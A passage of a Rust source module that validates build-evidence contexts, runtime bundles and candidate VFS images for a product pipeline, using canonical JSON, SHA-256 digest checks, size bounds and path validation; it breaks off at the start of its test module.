use super::builder_contract::{
    ResolvedVfsProductInputsV1, VfsBuilderReportV1, VfsProductIdentityV1, VfsReferenceClassV1,
    compare_builder_report, validate_builder_report, validate_resolved_inputs,
};
use super::canonical_json::{
    canonical_json_bytes, canonical_sha256, validate_absolute_posix_path, validate_git_sha,
    validate_sha256, validate_stable_id,
};
use super::evidence_policy::{
    EvidenceHostV1, ExactRuntimeBundleV1, GeneratedEvidenceDefinitionRegistryV1,
    GeneratedEvidenceDefinitionV1, NODE_EVIDENCE_IMPLEMENTATION_PATHS,
    validate_generated_evidence_definition, validate_runtime_artifact_inventory,
};
use super::guard_registry::GuardCodeV1;
use super::product_manifest::{VfsBootContractV1, VfsMountIntentV1, VfsProductCatalogV1};
use super::records::{
    CandidateProductEvidenceIdentityV1, ProductEvidenceOutcomeV1, ProductEvidenceResultProductV1,
    ProductEvidenceResultV1, ProductEvidenceRunV1, ProductRuntimeEvidenceIdentityV1,
    VerificationHostV1,
};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeSet;
use std::path::{Component, Path};

const CONTEXT_SCHEMA: u64 = 1;
const CONTEXT_KIND: &str = "kandelo-vfs-product-node-evidence-context";
const RESULT_SCHEMA: u64 = 1;
const RESULT_KIND: &str = "kandelo-vfs-product-evidence-result";
const MAX_DOCUMENT_BYTES: usize = 4 * 1024 * 1024;
const MAX_RUNTIME_BUNDLE_BYTES: usize = 16 * 1024 * 1024;
const MAX_RUNTIME_FILES: usize = 32_768;
const MAX_RUNTIME_BYTES: u64 = 1024 * 1024 * 1024;
const MAX_RUNTIME_FILE_BYTES: u64 = 256 * 1024 * 1024;
const MAX_RUNTIME_NODE_ENTRY_BYTES: u64 = 64 * 1024 * 1024;
const MAX_RUNTIME_KERNEL_BYTES: u64 = 512 * 1024 * 1024;
const MAX_VFS_BYTES: u64 = 256 * 1024 * 1024;
const MAX_DIAGNOSTICS: usize = 64;
const MAX_DIAGNOSTIC_BYTES: usize = 64 * 1024;

#[derive(Clone, Debug, Deserialize, PartialEq, Serialize)]
#[serde(deny_unknown_fields)]
pub struct NodeProductEvidenceContextV1 {
    pub schema: u64,
    pub kind: String,
    pub request_digest: String,
    pub product: ProductEvidenceResultProductV1,
    pub candidate_product: CandidateProductEvidenceIdentityV1,
    pub runtime: ProductRuntimeEvidenceIdentityV1,
    pub host: EvidenceHostV1,
    pub definition: GeneratedEvidenceDefinitionV1,
    pub boot: VfsBootContractV1,
    pub mounts: Vec<VfsMountIntentV1>,
    pub run: ProductEvidenceRunV1,
}

#[derive(Clone, Debug, Deserialize, PartialEq, Serialize)]
#[serde(deny_unknown_fields)]
pub struct CandidateProductLocatorV1 {
    pub product_id: String,
    pub repository: String,
    pub manifest_digest: String,
    pub immutable_reference: String,
    pub vfs_layer_sha256: String,
    pub vfs_layer_bytes: u64,
    pub builder_report_sha256: String,
}

pub fn parse_node_context(bytes: &[u8]) -> Result<NodeProductEvidenceContextV1, String> {
    if bytes.len() > MAX_DOCUMENT_BYTES {
        return Err("Node product evidence context exceeds the 4 MiB limit".to_string());
    }
    let context: NodeProductEvidenceContextV1 = serde_json::from_slice(bytes)
        .map_err(|error| format!("Node product evidence context is invalid JSON: {error}"))?;
    if canonical_json_bytes(&context)? != bytes {
        return Err("Node product evidence context is not canonical JSON".to_string());
    }
    validate_node_context_shape(&context)?;
    Ok(context)
}

pub fn validate_node_context(
    context: &NodeProductEvidenceContextV1,
    candidate_locator: &CandidateProductLocatorV1,
    protected_definitions: &GeneratedEvidenceDefinitionRegistryV1,
    protected_products: &VfsProductCatalogV1,
    runtime_bundle_bytes: &[u8],
    candidate_vfs_bytes: &[u8],
    kernel_wasm_bytes: &[u8],
) -> Result<(), String> {
    validate_node_context_shape(context)?;
    validate_candidate_locator(context, candidate_locator)?;
    validate_protected_definition(context, protected_definitions)?;
    validate_protected_product(context, protected_products)?;
    let runtime = runtime_identity_from_bundle(runtime_bundle_bytes)?;
    if context.runtime != runtime {
        return Err("Node evidence runtime differs from the exact runtime bundle".to_string());
    }
    if candidate_vfs_bytes.is_empty()
        || context.candidate_product.vfs_layer_bytes != candidate_vfs_bytes.len() as u64
        || context.candidate_product.vfs_layer_sha256 != sha256_bytes(candidate_vfs_bytes)
    {
        return Err("candidate VFS bytes differ from their exact identity".to_string());
    }
    if kernel_wasm_bytes.is_empty()
        || context.runtime.kernel.bytes != kernel_wasm_bytes.len() as u64
        || context.runtime.kernel.wasm_sha256 != sha256_bytes(kernel_wasm_bytes)
    {
        return Err("kernel bytes differ from the exact runtime identity".to_string());
    }
    Ok(())
}

pub fn validate_candidate_product_documents(
    context: &NodeProductEvidenceContextV1,
    candidate_locator: &CandidateProductLocatorV1,
    protected_products: &VfsProductCatalogV1,
    runtime_bundle: &ExactRuntimeBundleV1,
    resolved_input_bytes: &[u8],
    resolved_inputs: &ResolvedVfsProductInputsV1,
    builder_report_bytes: &[u8],
    builder_report: &VfsBuilderReportV1,
) -> Result<(), String> {
    if canonical_json_bytes(resolved_inputs)? != resolved_input_bytes {
        return Err("resolved product inputs are not canonical JSON".to_string());
    }
    if canonical_json_bytes(builder_report)? != builder_report_bytes {
        return Err("candidate builder report is not canonical JSON".to_string());
    }
    let report_sha256 = sha256_bytes(builder_report_bytes);
    if report_sha256 != candidate_locator.builder_report_sha256
        || report_sha256 != context.candidate_product.builder_report_sha256
    {
        return Err("candidate locator differs from the exact builder report bytes".to_string());
    }
    if resolved_inputs.reference_class != VfsReferenceClassV1::Candidate {
        return Err("resolved product inputs lack candidate protocol identity".to_string());
    }
    let selected = protected_products
        .products
        .iter()
        .find(|entry| entry.manifest.id == context.product.id)
        .ok_or_else(|| "resolved product inputs name an unprotected product".to_string())?;
    let expected_product = VfsProductIdentityV1 {
        id: context.product.id.clone(),
        manifest_path: selected.path.clone(),
        manifest_sha256: context.product.manifest_sha256.clone(),
        architecture: selected.manifest.architecture,
        output: selected.manifest.output.clone(),
    };
    if resolved_inputs.product != expected_product {
        return Err("resolved product identity differs from protected product intent".to_string());
    }
    if resolved_inputs.target_abi.version != u64::from(context.runtime.target_abi.version)
        || resolved_inputs.target_abi.snapshot_sha256 != context.runtime.target_abi.snapshot_sha256
    {
        return Err("resolved product inputs differ from the exact runtime ABI".to_string());
    }
    if resolved_inputs.source.repository != context.runtime.source.repository
        || resolved_inputs.source.commit != context.runtime.source.commit
        || resolved_inputs.source.tree != context.runtime.source.tree
    {
        return Err("resolved product inputs differ from the exact runtime source".to_string());
    }
    if resolved_inputs.build_environment.policy_sha256 != context.runtime.build_policy_sha256 {
        return Err(
            "resolved product build policy differs from the exact runtime policy".to_string(),
        );
    }
    let runtime_lock = runtime_bundle
        .inventory
        .iter()
        .find(|entry| entry.path == "flake.lock")
        .ok_or_else(|| "exact runtime inventory lacks flake.lock".to_string())?;
    if resolved_inputs.build_environment.dev_shell_lock_sha256 != runtime_lock.sha256 {
        return Err(
            "resolved product dev-shell lock differs from the exact runtime lock".to_string(),
        );
    }
    compare_builder_report(resolved_inputs, builder_report)?;
    if builder_report.output.sha256 != context.candidate_product.vfs_layer_sha256
        || builder_report.output.bytes != context.candidate_product.vfs_layer_bytes
    {
        return Err(
            "candidate builder report output differs from the exact candidate VFS".to_string(),
        );
    }
    Ok(())
}

fn validate_protected_definition(
    context: &NodeProductEvidenceContextV1,
    registry: &GeneratedEvidenceDefinitionRegistryV1,
) -> Result<(), String> {
    if registry.schema != 1
        || registry.kind != "kandelo-vfs-evidence-definitions"
        || registry.version == 0
    {
        return Err("protected evidence definition registry has unsupported identity".to_string());
    }
    if registry
        .definitions
        .windows(2)
        .any(|pair| pair[0].id >= pair[1].id)
    {
        return Err("protected evidence definitions must be sorted and duplicate-free".to_string());
    }
    match registry
        .definitions
        .iter()
        .find(|definition| definition.id == context.definition.id)
    {
        Some(definition) if definition == &context.definition => Ok(()),
        _ => Err("Node evidence definition differs from protected current policy".to_string()),
    }
}

fn validate_protected_product(
    context: &NodeProductEvidenceContextV1,
    catalog: &VfsProductCatalogV1,
) -> Result<(), String> {
    if catalog.schema != 1 || catalog.kind != "kandelo-vfs-product-catalog" {
        return Err("protected VFS product catalog has unsupported identity".to_string());
    }
    if catalog
        .products
        .windows(2)
        .any(|pair| pair[0].manifest.id >= pair[1].manifest.id)
    {
        return Err("protected VFS product catalog must be sorted and duplicate-free".to_string());
    }
    for entry in &catalog.products {
        validate_sha256(&entry.sha256)?;
        let expected_path = format!("images/vfs/products/{}.toml", entry.manifest.id);
        if entry.path != expected_path {
            return Err(format!(
                "protected VFS product {:?} has a noncanonical catalog path",
                entry.manifest.id
            ));
        }
        if entry.sha256 != canonical_sha256(&entry.manifest)? {
            return Err(format!(
                "protected VFS product {:?} catalog manifest digest is invalid",
                entry.manifest.id
            ));
        }
    }
    let entry = catalog
        .products
        .iter()
        .find(|entry| entry.manifest.id == context.product.id)
        .ok_or_else(|| "Node evidence product is absent from protected catalog".to_string())?;
    if entry.sha256 != context.product.manifest_sha256 {
        return Err("Node evidence product manifest differs from protected catalog".to_string());
    }
    if entry.manifest.boot.as_ref() != Some(&context.boot)
        || entry.manifest.mounts != context.mounts
    {
        return Err(
            "Node evidence boot or mount contract differs from protected product intent"
                .to_string(),
        );
    }
    if entry
        .manifest
        .evidence
        .node
        .as_ref()
        .map(|value| value.test.as_str())
        != Some(context.definition.id.as_str())
    {
        return Err(
            "Node evidence definition differs from the protected product registration".to_string(),
        );
    }
    Ok(())
}

pub fn runtime_identity_from_bundle(
    runtime_bundle_bytes: &[u8],
) -> Result<ProductRuntimeEvidenceIdentityV1, String> {
    if runtime_bundle_bytes.len() > MAX_RUNTIME_BUNDLE_BYTES {
        return Err("exact runtime bundle exceeds the 16 MiB limit".to_string());
    }
    let bundle: ExactRuntimeBundleV1 = serde_json::from_slice(runtime_bundle_bytes)
        .map_err(|error| format!("exact runtime bundle is invalid JSON: {error}"))?;
    if canonical_json_bytes(&bundle)? != runtime_bundle_bytes {
        return Err("exact runtime bundle is not canonical JSON".to_string());
    }
    validate_runtime_bundle_identity(&bundle)?;
    Ok(ProductRuntimeEvidenceIdentityV1 {
        bundle_sha256: sha256_bytes(runtime_bundle_bytes),
        source: bundle.source,
        target_abi: bundle.target_abi,
        kernel: bundle.kernel,
        host_runtime: bundle.host,
        browser: bundle.browser,
        build_policy_sha256: bundle.build_policy_sha256,
    })
}

pub fn parse_product_evidence_result(bytes: &[u8]) -> Result<ProductEvidenceResultV1, String> {
    if bytes.len() > MAX_DOCUMENT_BYTES {
        return Err("product evidence result exceeds the 4 MiB limit".to_string());
    }
    let result: ProductEvidenceResultV1 = serde_json::from_slice(bytes)
        .map_err(|error| format!("product evidence result is invalid JSON: {error}"))?;
    if canonical_json_bytes(&result)? != bytes {
        return Err("product evidence result is not canonical JSON".to_string());
    }
    validate_product_evidence_result(&result, None)?;
    Ok(result)
}

pub fn validate_product_evidence_result(
    result: &ProductEvidenceResultV1,
    expected: Option<&NodeProductEvidenceContextV1>,
) -> Result<(), String> {
    if result.schema != RESULT_SCHEMA || result.kind != RESULT_KIND {
        return Err("product evidence result has unsupported identity".to_string());
    }
    validate_sha256(&result.request_digest)?;
    validate_product(&result.product)?;
    validate_candidate(&result.candidate_product)?;
    validate_runtime_identity(&result.runtime)?;
    if !matches!(
        result.host,
        VerificationHostV1::Node | VerificationHostV1::Browser
    ) {
        return Err("product evidence host must be node or browser".to_string());
    }
    validate_stable_id(&result.definition.id, "product evidence definition id")?;
    validate_sha256(&result.definition.definition_sha256)?;
    let expected_guards: &[GuardCodeV1] = match result.outcome {
        ProductEvidenceOutcomeV1::Success => &[],
        ProductEvidenceOutcomeV1::Failure => &[GuardCodeV1::VerificationFailed],
        ProductEvidenceOutcomeV1::Timeout => &[GuardCodeV1::VerificationTimeout],
    };
    if result.guard_codes != expected_guards {
        return Err("product evidence outcome and guard codes contradict".to_string());
    }
    if result.bounded_diagnostics.len() > MAX_DIAGNOSTICS {
        return Err("product evidence diagnostics exceed their item bound".to_string());
    }
    let mut previous: Option<&str> = None;
    for diagnostic in &result.bounded_diagnostics {
        validate_stable_id(&diagnostic.id, "product evidence diagnostic id")?;
        if previous.is_some_and(|old| old >= diagnostic.id.as_str()) {
            return Err(
                "product evidence diagnostics must be sorted and duplicate-free".to_string(),
            );
        }
        previous = Some(&diagnostic.id);
        let bytes = diagnostic.text.as_bytes();
        if bytes.is_empty() || bytes.len() > MAX_DIAGNOSTIC_BYTES {
            return Err("product evidence diagnostic text exceeds its bound".to_string());
        }
        validate_sha256(&diagnostic.sha256)?;
        if diagnostic.bytes != bytes.len() as u64 || diagnostic.sha256 != sha256_bytes(bytes) {
            return Err("product evidence diagnostic differs from its bytes".to_string());
        }
    }
    validate_run(&result.run)?;
    if canonical_json_bytes(result)?.len() > MAX_DOCUMENT_BYTES {
        return Err("product evidence result exceeds the 4 MiB limit".to_string());
    }
    if let Some(context) = expected {
        let expected_host = match context.host {
            EvidenceHostV1::Node => VerificationHostV1::Node,
            EvidenceHostV1::Browser => VerificationHostV1::Browser,
        };
        if result.request_digest != context.request_digest
            || result.product != context.product
            || result.candidate_product != context.candidate_product
            || result.runtime != context.runtime
            || result.host != expected_host
            || result.definition.id != context.definition.id
            || result.definition.definition_sha256 != context.definition.definition_sha256
            || result.run != context.run
        {
            return Err(
                "product evidence result differs from its exact execution context".to_string(),
            );
        }
    }
    Ok(())
}

fn validate_node_context_shape(context: &NodeProductEvidenceContextV1) -> Result<(), String> {
    if context.schema != CONTEXT_SCHEMA || context.kind != CONTEXT_KIND {
        return Err("Node product evidence context has unsupported identity".to_string());
    }
    validate_sha256(&context.request_digest)?;
    validate_product(&context.product)?;
    validate_candidate(&context.candidate_product)?;
    validate_runtime_identity(&context.runtime)?;
    if context.host != EvidenceHostV1::Node || context.definition.host != EvidenceHostV1::Node {
        return Err("Node product evidence context has a non-Node host".to_string());
    }
    validate_generated_evidence_definition(&context.definition)?;
    let implementation_paths = context
        .definition
        .implementation
        .iter()
        .map(|item| item.path.as_str())
        .collect::<Vec<_>>();
    if implementation_paths != NODE_EVIDENCE_IMPLEMENTATION_PATHS {
        return Err(
            "Node evidence definition is not bound to the protected Node runner".to_string(),
        );
    }
    validate_boot(&context.boot)?;
    validate_mounts(&context.mounts)?;
    validate_run(&context.run)
}

fn validate_product(product: &ProductEvidenceResultProductV1) -> Result<(), String> {
    validate_stable_id(&product.id, "product evidence product id")?;
    validate_sha256(&product.manifest_sha256)
}

fn validate_candidate(candidate: &CandidateProductEvidenceIdentityV1) -> Result<(), String> {
    let Some(digest) = candidate.manifest_digest.strip_prefix("sha256:") else {
        return Err("candidate product manifest is not an OCI SHA-256 digest".to_string());
    };
    validate_sha256(digest)?;
    validate_sha256(&candidate.vfs_layer_sha256)?;
    validate_sha256(&candidate.builder_report_sha256)?;
    if candidate.vfs_layer_bytes == 0 || candidate.vfs_layer_bytes > MAX_VFS_BYTES {
        return Err(
            "candidate product VFS byte count must be within 1 through 256 MiB".to_string(),
        );
    }
    Ok(())
}

fn validate_candidate_locator(
    context: &NodeProductEvidenceContextV1,
    locator: &CandidateProductLocatorV1,
) -> Result<(), String> {
    validate_stable_id(&locator.product_id, "candidate product locator ID")?;
    validate_text(
        &locator.repository,
        "candidate product locator repository",
        520,
    )?;
    let expected_repository = format!(
        "ghcr.io/kandelo-dev/homebrew-tap-core-abi-{}-candidates/products/{}",
        context.runtime.target_abi.version, locator.product_id
    );
    if locator.repository != expected_repository {
        return Err(
            "candidate product locator is outside its exact candidate repository".to_string(),
        );
    }
    let digest = locator
        .manifest_digest
        .strip_prefix("sha256:")
        .ok_or_else(|| "candidate product locator manifest is not an OCI digest".to_string())?;
    validate_sha256(digest)?;
    if locator.immutable_reference != format!("{}@{}", locator.repository, locator.manifest_digest)
    {
        return Err("candidate product locator is not immutable".to_string());
    }
    validate_sha256(&locator.vfs_layer_sha256)?;
    validate_sha256(&locator.builder_report_sha256)?;
    if locator.product_id != context.product.id
        || locator.manifest_digest != context.candidate_product.manifest_digest
        || locator.vfs_layer_sha256 != context.candidate_product.vfs_layer_sha256
        || locator.vfs_layer_bytes != context.candidate_product.vfs_layer_bytes
        || locator.builder_report_sha256 != context.candidate_product.builder_report_sha256
    {
        return Err(
            "candidate product locator differs from the exact evidence context".to_string(),
        );
    }
    Ok(())
}

fn validate_runtime_identity(runtime: &ProductRuntimeEvidenceIdentityV1) -> Result<(), String> {
    validate_sha256(&runtime.bundle_sha256)?;
    validate_repository(&runtime.source.repository, "runtime source repository")?;
    validate_git_sha(&runtime.source.commit)?;
    validate_git_sha(&runtime.source.tree)?;
    validate_sha256(&runtime.target_abi.snapshot_sha256)?;
    validate_sha256(&runtime.kernel.wasm_sha256)?;
    validate_sha256(&runtime.kernel.snapshot_sha256)?;
    validate_sha256(&runtime.host_runtime.bundle_sha256)?;
    validate_sha256(&runtime.host_runtime.generated_abi_sha256)?;
    validate_sha256(&runtime.host_runtime.worker_protocol_sha256)?;
    validate_sha256(&runtime.browser.bundle_sha256)?;
    validate_sha256(&runtime.browser.service_worker_sha256)?;
    validate_sha256(&runtime.build_policy_sha256)?;
    if runtime.kernel.bytes == 0
        || runtime.host_runtime.bytes == 0
        || runtime.browser.bytes == 0
        || runtime.kernel.abi_version != runtime.target_abi.version
        || runtime.kernel.snapshot_sha256 != runtime.target_abi.snapshot_sha256
    {
        return Err("runtime evidence identity is internally inconsistent".to_string());
    }
    Ok(())
}

fn validate_runtime_bundle_identity(bundle: &ExactRuntimeBundleV1) -> Result<(), String> {
    if bundle.schema != 1 || bundle.kind != "kandelo-exact-runtime-bundle" {
        return Err("exact runtime bundle has unsupported identity".to_string());
    }
    validate_runtime_identity(&ProductRuntimeEvidenceIdentityV1 {
        bundle_sha256: "0".repeat(64),
        source: bundle.source.clone(),
        target_abi: bundle.target_abi.clone(),
        kernel: bundle.kernel.clone(),
        host_runtime: bundle.host.clone(),
        browser: bundle.browser.clone(),
        build_policy_sha256: bundle.build_policy_sha256.clone(),
    })?;
    if bundle.inventory.is_empty() || bundle.inventory.len() > MAX_RUNTIME_FILES {
        return Err("runtime inventory is empty or exceeds its item bound".to_string());
    }
    let mut previous: Option<&str> = None;
    let mut total = 0_u64;
    for entry in &bundle.inventory {
        validate_relative_path(&entry.path, "runtime inventory path")?;
        if previous.is_some_and(|old| old >= entry.path.as_str()) {
            return Err("runtime inventory must be sorted and duplicate-free".to_string());
        }
        previous = Some(&entry.path);
        validate_sha256(&entry.sha256)?;
        if entry.bytes == 0 {
            return Err("runtime inventory entries must have positive byte counts".to_string());
        }
        let file_limit = if matches!(
            entry.path.as_str(),
            "host/dist/index.js" | "host/dist/node-kernel-worker-entry.js"
        ) {
            MAX_RUNTIME_NODE_ENTRY_BYTES
        } else if entry.path == "kernel.wasm" {
            MAX_RUNTIME_KERNEL_BYTES
        } else {
            MAX_RUNTIME_FILE_BYTES
        };
        if entry.bytes > file_limit {
            return Err(format!(
                "runtime inventory file {:?} exceeds its byte bound",
                entry.path
            ));
        }
        total = total
            .checked_add(entry.bytes)
            .ok_or_else(|| "runtime inventory byte count overflowed".to_string())?;
    }
    if total > MAX_RUNTIME_BYTES {
        return Err("runtime inventory exceeds its byte bound".to_string());
    }
    let exact = |path: &str| {
        bundle
            .inventory
            .iter()
            .find(|entry| entry.path == path)
            .ok_or_else(|| format!("runtime inventory lacks {path}"))
    };
    let kernel = exact("kernel.wasm")?;
    let generated = exact("host/generated-abi.ts")?;
    let protocol = exact("host/worker-protocol.ts")?;
    let service_worker = exact("browser/dist/service-worker.js")?;
    exact("flake.lock")?;
    exact("host/dist/index.js")?;
    exact("host/dist/node-kernel-worker-entry.js")?;
    exact("host/package.json")?;
    if kernel.sha256 != bundle.kernel.wasm_sha256
        || kernel.bytes != bundle.kernel.bytes
        || generated.sha256 != bundle.host.generated_abi_sha256
        || protocol.sha256 != bundle.host.worker_protocol_sha256
        || service_worker.sha256 != bundle.browser.service_worker_sha256
    {
        return Err("runtime inventory differs from its exact component identities".to_string());
    }
    let host = bundle
        .inventory
        .iter()
        .filter(|entry| entry.path.starts_with("host/"))
        .cloned()
        .collect::<Vec<_>>();
    let browser = bundle
        .inventory
        .iter()
        .filter(|entry| entry.path.starts_with("browser/"))
        .cloned()
        .collect::<Vec<_>>();
    if host.is_empty()
        || browser.is_empty()
        || canonical_sha256(&host)? != bundle.host.bundle_sha256
        || host.iter().map(|entry| entry.bytes).sum::<u64>() != bundle.host.bytes
        || canonical_sha256(&browser)? != bundle.browser.bundle_sha256
        || browser.iter().map(|entry| entry.bytes).sum::<u64>() != bundle.browser.bytes
    {
        return Err("runtime host or browser bundle differs from its inventory".to_string());
    }
    Ok(())
}

fn validate_boot(boot: &VfsBootContractV1) -> Result<(), String> {
    if boot.argv.is_empty() || boot.argv.len() > 64 {
        return Err("evidence boot argv is empty or exceeds its item bound".to_string());
    }
    if boot.argv[0].is_empty() {
        return Err("evidence boot executable must not be empty".to_string());
    }
    for argument in &boot.argv {
        if argument.len() > 4_096 || argument.contains('\0') {
            return Err("evidence boot arguments exceed their byte bound".to_string());
        }
    }
    validate_absolute_posix_path(&boot.cwd)?;
    if boot.uid > u32::MAX as u64 || boot.gid > u32::MAX as u64 {
        return Err("evidence boot uid or gid exceeds its unsigned 32-bit bound".to_string());
    }
    if boot.env.len() > 128 {
        return Err("evidence boot environment exceeds its item bound".to_string());
    }
    for (name, value) in &boot.env {
        if !valid_env_name(name) {
            return Err(format!(
                "evidence boot environment name {name:?} is invalid"
            ));
        }
        if value.len() > 8_192 || value.contains('\0') {
            return Err("evidence boot environment value exceeds its byte bound".to_string());
        }
    }
    Ok(())
}

fn validate_mounts(mounts: &[VfsMountIntentV1]) -> Result<(), String> {
    if mounts.is_empty() || mounts.len() > 64 {
        return Err("evidence mounts are empty or exceed their item bound".to_string());
    }
    let mut paths = BTreeSet::new();
    let mut built_root = false;
    for mount in mounts {
        let path = match mount {
            VfsMountIntentV1::BuiltImage { path, .. } => {
                if path == "/" {
                    built_root = true;
                }
                path
            }
            VfsMountIntentV1::Scratch {
                path,
                mode,
                uid,
                gid,
                ephemeral,
            } => {
                if !*ephemeral
                    || !matches!(mode.len(), 3 | 4)
                    || !mode.bytes().all(|byte| matches!(byte, b'0'..=b'7'))
                    || *uid > u32::MAX as u64
                    || *gid > u32::MAX as u64
                {
                    return Err("evidence scratch mount contract is invalid".to_string());
                }
                path
            }
        };
        validate_absolute_posix_path(path)?;
        if !paths.insert(path) {
            return Err("evidence mount paths must be unique".to_string());
        }
    }
    if !built_root {
        return Err("evidence mounts lack the exact candidate image at /".to_string());
    }
    Ok(())
}

fn validate_run(run: &ProductEvidenceRunV1) -> Result<(), String> {
    validate_repository(&run.repository, "product evidence run repository")?;
    validate_text(
        &run.workflow_ref,
        "product evidence workflow reference",
        2_048,
    )?;
    validate_stable_id(&run.job_id, "product evidence job id")?;
    if run.run_id == 0 || run.attempt == 0 {
        return Err("product evidence run id and attempt must be positive".to_string());
    }
    Ok(())
}

fn validate_repository(value: &str, field: &str) -> Result<(), String> {
    validate_text(value, field, 255)?;
    let mut parts = value.split('/');
    let owner = parts.next().unwrap_or_default();
    let repository = parts.next().unwrap_or_default();
    if owner.is_empty()
        || repository.is_empty()
        || parts.next().is_some()
        || !value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'/' | b'.' | b'_' | b'-'))
    {
        return Err(format!("{field} must be an exact owner/name identity"));
    }
    Ok(())
}

fn validate_relative_path(value: &str, field: &str) -> Result<(), String> {
    if value.is_empty()
        || value.len() > 4_096
        || value.starts_with('/')
        || value.contains(['\\', '\0'])
        || value
            .split('/')
            .any(|component| component.is_empty() || matches!(component, "." | ".."))
        || Path::new(value)
            .components()
            .any(|component| !matches!(component, Component::Normal(_)))
    {
        return Err(format!("{field} is not a normalized relative path"));
    }
    Ok(())
}

fn validate_text(value: &str, field: &str, maximum: usize) -> Result<(), String> {
    if value.is_empty() || value.len() > maximum || value.contains('\0') {
        return Err(format!(
            "{field} must contain 1 through {maximum} UTF-8 bytes"
        ));
    }
    Ok(())
}

fn valid_env_name(value: &str) -> bool {
    let mut chars = value.chars();
    matches!(chars.next(), Some(character) if character.is_ascii_alphabetic() || character == '_')
        && chars.all(|character| character == '_' || character.is_ascii_alphanumeric())
}

fn sha256_bytes(bytes: &[u8]) -> String {
    format!("{:x}", Sha256::digest(bytes))
}

fn read_regular_bounded(path: &Path, label: &str, maximum: usize) -> Result<Vec<u8>, String> {
    let metadata = std::fs::symlink_metadata(path)
        .map_err(|error| format!("cannot inspect {label} {path:?}: {error}"))?;
    if metadata.file_type().is_symlink() || !metadata.is_file() {
        return Err(format!(
            "{label} must be a regular non-symlink file: {path:?}"
        ));
    }
    if metadata.len() > maximum as u64 {
        return Err(format!("{label} exceeds its byte bound"));
    }
    std::fs::read(path).map_err(|error| format!("cannot read {label} {path:?}: {error}"))
}

pub fn run_cli(action: &str, args: &[String]) -> Result<(), String> {
    match action {
        "validate-result" => {
            if args.len() != 2 || args[0] != "--result" {
                return Err(
                    "product-evidence validate-result requires exactly --result <path>".to_string(),
                );
            }
            let bytes = read_regular_bounded(
                Path::new(&args[1]),
                "product evidence result",
                MAX_DOCUMENT_BYTES,
            )?;
            parse_product_evidence_result(&bytes)?;
            Ok(())
        }
        "validate-context" => {
            if args.len() != 22
                || args[0] != "--context"
                || args[2] != "--candidate-locator"
                || args[4] != "--definitions"
                || args[6] != "--products"
                || args[8] != "--runtime-bundle"
                || args[10] != "--runtime-root"
                || args[12] != "--resolved-inputs"
                || args[14] != "--input-root"
                || args[16] != "--builder-report"
                || args[18] != "--report-root"
                || args[20] != "--vfs"
            {
                return Err(
                    "product-evidence validate-context requires --context <path> --candidate-locator <path> --definitions <path> --products <path> --runtime-bundle <path> --runtime-root <dir> --resolved-inputs <path> --input-root <dir> --builder-report <path> --report-root <dir> --vfs <path>"
                        .to_string(),
                );
            }
            let context_bytes = read_regular_bounded(
                Path::new(&args[1]),
                "Node product evidence context",
                MAX_DOCUMENT_BYTES,
            )?;
            let locator_bytes = read_regular_bounded(
                Path::new(&args[3]),
                "candidate product locator",
                MAX_DOCUMENT_BYTES,
            )?;
            let candidate_locator: CandidateProductLocatorV1 =
                serde_json::from_slice(&locator_bytes).map_err(|error| {
                    format!("candidate product locator is invalid JSON: {error}")
                })?;
            if canonical_json_bytes(&candidate_locator)? != locator_bytes {
                return Err("candidate product locator is not canonical JSON".to_string());
            }
            let definitions_bytes = read_regular_bounded(
                Path::new(&args[5]),
                "protected evidence definition registry",
                MAX_DOCUMENT_BYTES,
            )?;
            let protected_definitions: GeneratedEvidenceDefinitionRegistryV1 =
                serde_json::from_slice(&definitions_bytes).map_err(|error| {
                    format!("protected evidence definition registry is invalid JSON: {error}")
                })?;
            if canonical_json_bytes(&protected_definitions)? != definitions_bytes {
                return Err(
                    "protected evidence definition registry is not canonical JSON".to_string(),
                );
            }
            let products_bytes = read_regular_bounded(
                Path::new(&args[7]),
                "protected VFS product catalog",
                MAX_DOCUMENT_BYTES,
            )?;
            let protected_products: VfsProductCatalogV1 = serde_json::from_slice(&products_bytes)
                .map_err(|error| {
                format!("protected VFS product catalog is invalid JSON: {error}")
            })?;
            if canonical_json_bytes(&protected_products)? != products_bytes {
                return Err("protected VFS product catalog is not canonical JSON".to_string());
            }
            let runtime_bytes = read_regular_bounded(
                Path::new(&args[9]),
                "exact runtime bundle",
                MAX_RUNTIME_BUNDLE_BYTES,
            )?;
            let runtime_bundle: ExactRuntimeBundleV1 = serde_json::from_slice(&runtime_bytes)
                .map_err(|error| format!("exact runtime bundle is invalid JSON: {error}"))?;
            validate_runtime_artifact_inventory(Path::new(&args[11]), &runtime_bundle)?;
            let resolved_input_bytes = read_regular_bounded(
                Path::new(&args[13]),
                "resolved product inputs",
                MAX_DOCUMENT_BYTES,
            )?;
            let resolved_inputs =
                validate_resolved_inputs(&resolved_input_bytes, Path::new(&args[15]))?;
            let builder_report_bytes = read_regular_bounded(
                Path::new(&args[17]),
                "candidate builder report",
                MAX_DOCUMENT_BYTES,
            )?;
            let builder_report =
                validate_builder_report(&builder_report_bytes, Path::new(&args[19]))?;
            let context = parse_node_context(&context_bytes)?;
            let vfs_bytes = read_regular_bounded(
                Path::new(&args[21]),
                "candidate VFS",
                usize::try_from(context.candidate_product.vfs_layer_bytes)
                    .unwrap_or(MAX_VFS_BYTES as usize)
                    .min(MAX_VFS_BYTES as usize),
            )?;
            let kernel_bytes = read_regular_bounded(
                &Path::new(&args[11]).join("kernel.wasm"),
                "runtime kernel",
                512 * 1024 * 1024,
            )?;
            validate_candidate_product_documents(
                &context,
                &candidate_locator,
                &protected_products,
                &runtime_bundle,
                &resolved_input_bytes,
                &resolved_inputs,
                &builder_report_bytes,
                &builder_report,
            )?;
            validate_node_context(
                &context,
                &candidate_locator,
                &protected_definitions,
                &protected_products,
                &runtime_bytes,
                &vfs_bytes,
                &kernel_bytes,
            )
        }
        _ => Err(format!(
            "unknown product-evidence action {action:?}; expected validate-context or validate-result"
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::super::builder_contract::{
        ExactSourceV1, ResolvedVfsProductInputsV1, TargetAbiV1, VfsBuildEnvironmentV1,
        VfsBuilderCaptureV1, VfsBuilderOutputV1, VfsBuilderReportV1, VfsProductIdentityV1,
        VfsReferenceClassV1,
    };
    use super::super::evidence_policy::{
        EvidenceImplementationV1, EvidenceRunnerV1, RuntimeBrowserIdentityV1,
        RuntimeHostIdentityV1, RuntimeInventoryEntryV1, RuntimeKernelIdentityV1,
        RuntimeSourceIdentityV1, RuntimeTargetAbiV1, generated_definition_sha256,
    };
    use super::super::product_manifest::{
